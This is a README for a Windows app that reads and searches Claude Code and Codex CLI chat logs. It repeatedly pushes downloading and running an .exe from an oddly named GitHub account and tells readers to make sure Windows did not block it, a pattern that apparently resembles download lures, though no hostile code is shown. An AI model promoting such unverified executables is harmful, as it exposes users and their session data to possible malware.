# 🗂️ cli-history-hub - Browse AI Chat Logs Locally

[![Download cli-history-hub](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/newsprung-excrescence697/cli-history-hub)

## 📌 What this app does

CLI History Hub is a local web app for viewing, searching, and managing chat history from AI coding tools on Windows.

It reads your saved JSONL session files from your computer and shows them in a simple browser view. You do not need a database. You do not need to set up a server. You start it, open it, and use it.

It currently works with:

- Claude Code
- OpenAI Codex CLI

It keeps each source separate, so your history stays easy to scan.

## 🪟 Windows download and setup

### 1. Download the app

Use this link to visit the download page:

[Download CLI History Hub](https://github.com/newsprung-excrescence697/cli-history-hub)

### 2. Get the Windows file

On the page, download the Windows build or the source package that includes the app files.

If you see a `.exe`, download and run that file.

If you see a release archive like `.zip`, download it and extract it first.

### 3. Open the app

If you downloaded an `.exe` file:

- Double-click the file
- Let Windows open it
- Wait for the app window to appear

If you downloaded a `.zip` file:

- Right-click the file
- Select Extract All
- Open the extracted folder
- Start the app file inside the folder

### 4. Open it in your browser

The app starts a local web page on your computer.

- Open the address shown by the app
- It may look like `http://localhost:xxxx`
- Use that page in your browser to view your history

## 🧭 How to use it

### View your history

After the app opens, it scans your local session folders and shows the chat history in a clean list.

You can:

- Browse by project
- Open one chat thread
- Read the full conversation
- Jump between dates
- See the source of each session

### Search for past chats

Use the search box to find old conversations by:

- Project name
- File name
- Message text
- Date
- Tool name

This helps when you want to find one command, prompt, or answer from weeks ago.

### Manage large history sets

If you have many sessions, the app groups them so the list stays easy to use.

You can:

- Collapse and expand groups
- Focus on one project
- Switch between Claude Code and Codex CLI
- Scan the latest items first

## ✨ Main features

### 🗂️ Multi-source support

The app can read from more than one AI tool folder.

Supported folders include:

- Claude Code: `~/.claude/projects/`
- OpenAI Codex CLI: `~/.codex/sessions/`

If one source is not present, the app skips it and keeps working.

### 📁 Project grouping

Sessions are grouped by working folder, so you can find chats by project instead of sorting through one long list.

This helps when you work on many apps or repos.

### 🔎 Fast search

Search across your stored sessions to find the right thread fast.

Use it to find:

- A prompt you used before
- A code fix
- An answer from the assistant
- A project name

### 🧾 Raw format kept intact

The app reads your JSONL session files and keeps the original format.

That means:

- No data conversion
- No import step
- No extra sync process

### 🖥️ Local only

Your history stays on your machine.

The app works as a local web page and does not need a remote account or cloud database.

## 📂 Where your data lives

CLI History Hub reads the session folders used by your AI tools.

Common paths:

- Claude Code: `~/.claude/projects/`
- OpenAI Codex CLI: `~/.codex/sessions/`

If your files are in a custom location, place them in a folder the app can read, or move them into the expected path.

## 🚀 First run checklist

Before you open the app, check these items:

- You have Windows 10 or Windows 11
- You have a recent version of Node.js 18 or later, if the app asks for it
- You already used Claude Code or Codex CLI at least once
- Your session files exist on your computer

Then:

1. Download the app
2. Open the file
3. Let it scan your session folders
4. Open the local web page in your browser
5. Browse or search your history

## 🛠️ If the app does not open

Try these common fixes:

- Run the file again
- Check that Windows did not block the file
- Make sure your session files exist
- Confirm that Claude Code or Codex CLI has created history files
- Restart the app after adding new sessions

If the page does not load in your browser:

- Look for the local address in the app window
- Copy it into the address bar
- Make sure no other app is using the same port

## 📄 Supported file types

The app works with JSONL session files.

These are plain text log files where each line stores one event or message.

You do not need to edit them by hand.

## 🔍 What you can expect on screen

The app shows a simple view with:

- A sidebar for sources and projects
- A session list
- A chat detail view
- Search tools
- Time-based sorting
- Collapsible groups

This layout helps you move through long chat histories without digging through folders.

## 🧩 Example use cases

Use CLI History Hub if you want to:

- Find an old AI answer fast
- Check how a code fix was written
- Review past prompts
- Compare chats from different tools
- Keep local records of your coding work

## 🧰 Basic requirements

To run the app on Windows, you will usually need:

- Windows 10 or newer
- A modern browser such as Chrome, Edge, or Firefox
- Access to your local user folder
- Node.js 18+ if you are running from source or using a Node-based build

## 📦 Files you may see after download

Depending on the package, you may see:

- `cli-history-hub.exe`
- `cli-history-hub.zip`
- `package.json`
- `dist/`
- `src/`

If you have an `.exe`, open it.

If you have a `.zip`, extract it first.

If you have source files, use the included app start file or the command listed in the project files.

## 🔧 For better results

Keep your AI tool session folders in their default locations when possible. That helps the app find them without extra setup.

Also:

- Keep older session files intact
- Avoid renaming the JSONL files by hand
- Start the app again after new chats are created

## 📌 Quick path reference

- Claude Code sessions: `~/.claude/projects/`
- Codex CLI sessions: `~/.codex/sessions/`
- App view: your local browser
- Data source: local JSONL files on your PC

## 📥 Download again

[Download CLI History Hub](https://github.com/newsprung-excrescence697/cli-history-hub)

## 🧭 Use flow

1. Download the app
2. Open it on Windows
3. Let it scan your session folders
4. Open the local browser page
5. Search, browse, and review your AI chat history